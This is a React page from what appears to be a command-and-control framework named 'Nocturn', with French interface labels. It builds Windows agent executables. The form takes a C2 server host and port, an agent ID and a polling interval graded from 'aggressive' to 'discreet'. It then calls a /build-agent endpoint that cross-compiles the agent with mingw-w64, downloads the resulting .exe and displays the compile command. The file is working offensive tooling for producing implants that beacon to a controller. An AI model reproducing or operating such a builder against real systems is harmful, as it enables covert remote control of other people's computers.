import { useState } from 'react'
import api from '../lib/api'
import Navbar from '../components/Navbar'

type BuildStatus = 'idle' | 'building' | 'success' | 'error'

export default function Builder() {
  const [serverHost, setServerHost] = useState('nocturn.roadmvn.com')
  const [serverPort, setServerPort] = useState(1234)
  const [agentId, setAgentId] = useState('agent-001')
  const [delayMs, setDelayMs] = useState(3000)
  const [status, setStatus] = useState<BuildStatus>('idle')
  const [errorMsg, setErrorMsg] = useState('')

  const handleBuild = async () => {
    setStatus('building')
    setErrorMsg('')

    try {
      const res = await api.post('/build-agent', {
        server_host: serverHost,
        server_port: serverPort,
        agent_id: agentId,
        delay_ms: delayMs,
      }, { responseType: 'blob' })

      // Déclenche le téléchargement
      const url = URL.createObjectURL(res.data)
      const a = document.createElement('a')
      a.href = url
      a.download = `nocturn-${agentId}.exe`
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
      URL.revokeObjectURL(url)
      setStatus('success')
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: Blob } }
      let msg = 'Erreur de compilation'
      if (axiosErr.response?.data) {
        try {
          const text = await axiosErr.response.data.text()
          const json = JSON.parse(text)
          msg = json.error || msg
          if (json.details) msg += `\n${json.details}`
        } catch {
          // ignore
        }
      }
      setErrorMsg(msg)
      setStatus('error')
    }
  }

  const buildCommand = [
    `x86_64-w64-mingw32-gcc agent.c \\`,
    `  -DSERVER_HOST=\\"${serverHost}\\" \\`,
    `  -DSERVER_PORT=${serverPort} \\`,
    `  -DAGENT_ID=\\"${agentId}\\" \\`,
    `  -DDELAY_MS=${delayMs} \\`,
    `  -o nocturn-${agentId}.exe \\`,
    `  -static -lws2_32 -lwinhttp`,
  ].join('\n')

  return (
    <div className="min-h-screen" style={{ background: 'var(--bg-primary)' }}>
      <Navbar />

      <main className="max-w-2xl mx-auto px-6 py-10">
        <div className="mb-8">
          <h1 className="text-2xl font-bold mb-2" style={{ color: 'var(--text-primary)' }}>
            Générer un agent
          </h1>
          <p className="text-sm" style={{ color: 'var(--text-muted)' }}>
            Configure et compile l'agent Windows. Le binaire sera téléchargé automatiquement.
          </p>
        </div>

        <div
          className="rounded-2xl border p-8 space-y-6"
          style={{ background: 'var(--bg-card)', borderColor: 'var(--border)' }}
        >
          {/* Server Host */}
          <div>
            <label className="block text-sm font-medium mb-2" style={{ color: 'var(--text-primary)' }}>
              Serveur C2
            </label>
            <input
              type="text"
              value={serverHost}
              onChange={(e) => setServerHost(e.target.value)}
              placeholder="nocturn.roadmvn.com"
              className="w-full px-4 py-3 rounded-lg font-mono text-sm outline-none"
              style={{
                background: '#0a0a0f',
                border: '1px solid var(--border)',
                color: '#a78bfa',
              }}
              onFocus={(e) => e.target.style.borderColor = '#7c3aed'}
              onBlur={(e) => e.target.style.borderColor = 'var(--border)'}
            />
            <p className="text-xs mt-1" style={{ color: 'var(--text-muted)' }}>
              IP ou domaine que l'agent devra contacter
            </p>
          </div>

          {/* Server Port */}
          <div>
            <label className="block text-sm font-medium mb-2" style={{ color: 'var(--text-primary)' }}>
              Port API
            </label>
            <input
              type="number"
              value={serverPort}
              onChange={(e) => setServerPort(Number(e.target.value))}
              className="w-full px-4 py-3 rounded-lg font-mono text-sm outline-none"
              style={{
                background: '#0a0a0f',
                border: '1px solid var(--border)',
                color: '#a78bfa',
              }}
              onFocus={(e) => e.target.style.borderColor = '#7c3aed'}
              onBlur={(e) => e.target.style.borderColor = 'var(--border)'}
            />
          </div>

          {/* Agent ID */}
          <div>
            <label className="block text-sm font-medium mb-2" style={{ color: 'var(--text-primary)' }}>
              Identifiant agent
            </label>
            <input
              type="text"
              value={agentId}
              onChange={(e) => setAgentId(e.target.value)}
              placeholder="agent-001"
              className="w-full px-4 py-3 rounded-lg font-mono text-sm outline-none"
              style={{
                background: '#0a0a0f',
                border: '1px solid var(--border)',
                color: '#a78bfa',
              }}
              onFocus={(e) => e.target.style.borderColor = '#7c3aed'}
              onBlur={(e) => e.target.style.borderColor = 'var(--border)'}
            />
            <p className="text-xs mt-1" style={{ color: 'var(--text-muted)' }}>
              Identifiant unique pour cet agent (ex: agent-001, agent-lab)
            </p>
          </div>

          {/* Delay */}
          <div>
            <label className="block text-sm font-medium mb-2" style={{ color: 'var(--text-primary)' }}>
              Intervalle de polling — <span style={{ color: '#a78bfa' }}>{delayMs}ms</span>
            </label>
            <input
              type="range"
              min={500}
              max={15000}
              step={500}
              value={delayMs}
              onChange={(e) => setDelayMs(Number(e.target.value))}
              className="w-full accent-violet-600"
            />
            <div className="flex justify-between text-xs mt-1" style={{ color: 'var(--text-muted)' }}>
              <span>500ms (agressif)</span>
              <span>15000ms (discret)</span>
            </div>
          </div>

          {/* Config defines preview */}
          <div
            className="rounded-lg p-4 font-mono text-xs"
            style={{ background: '#0d0d0d', border: '1px solid var(--border)' }}
          >
            <div style={{ color: 'var(--text-muted)' }}>// Configuration agent</div>
            <div><span style={{ color: '#a78bfa' }}>#define</span> <span style={{ color: '#00ff41' }}>SERVER_HOST</span> <span style={{ color: '#fbbf24' }}>"{serverHost}"</span></div>
            <div><span style={{ color: '#a78bfa' }}>#define</span> <span style={{ color: '#00ff41' }}>SERVER_PORT</span> <span style={{ color: '#fbbf24' }}>{serverPort}</span></div>
            <div><span style={{ color: '#a78bfa' }}>#define</span> <span style={{ color: '#00ff41' }}>AGENT_ID</span> <span style={{ color: '#fbbf24' }}>"{agentId}"</span></div>
            <div><span style={{ color: '#a78bfa' }}>#define</span> <span style={{ color: '#00ff41' }}>DELAY_MS</span> <span style={{ color: '#fbbf24' }}>{delayMs}</span></div>
          </div>

          {/* Build command preview */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-semibold uppercase tracking-wider" style={{ color: 'var(--text-muted)' }}>
                Commande de compilation
              </span>
              <span
                className="text-xs px-2 py-0.5 rounded font-mono"
                style={{ background: 'rgba(0,255,65,0.08)', color: '#00ff41', border: '1px solid rgba(0,255,65,0.2)' }}
              >
                mingw-w64
              </span>
            </div>
            <div
              className="rounded-lg p-4 font-mono text-xs overflow-x-auto"
              style={{ background: '#060606', border: '1px solid rgba(0,255,65,0.15)' }}
            >
              <pre className="terminal-glow whitespace-pre" style={{ color: '#00ff41', margin: 0 }}>
                {buildCommand}
              </pre>
            </div>
          </div>

          {/* Status */}
          {status === 'success' && (
            <div
              className="px-4 py-3 rounded-lg text-sm"
              style={{ background: 'rgba(34,197,94,0.1)', color: '#22c55e', border: '1px solid rgba(34,197,94,0.3)' }}
            >
              ✓ Agent compilé — téléchargement lancé : nocturn-{agentId}.exe
            </div>
          )}

          {status === 'error' && (
            <div
              className="px-4 py-3 rounded-lg text-sm font-mono whitespace-pre-wrap"
              style={{ background: 'rgba(239,68,68,0.1)', color: '#f87171', border: '1px solid rgba(239,68,68,0.3)' }}
            >
              ✗ {errorMsg}
            </div>
          )}

          {/* Button */}
          <button
            onClick={handleBuild}
            disabled={status === 'building'}
            className="w-full py-3.5 rounded-lg font-semibold text-sm transition-all glow-purple"
            style={{
              background: status === 'building'
                ? 'rgba(124,58,237,0.3)'
                : 'linear-gradient(135deg, #7c3aed, #4f46e5)',
              color: status === 'building' ? '#a78bfa' : 'white',
              cursor: status === 'building' ? 'not-allowed' : 'pointer',
            }}
          >
            {status === 'building' ? 'Compilation en cours...' : 'Compiler & Télécharger'}
          </button>

          <p className="text-xs text-center" style={{ color: 'var(--text-muted)' }}>
            Nécessite mingw-w64 installé sur le serveur Nocturn
          </p>
        </div>
      </main>
    </div>
  )
}
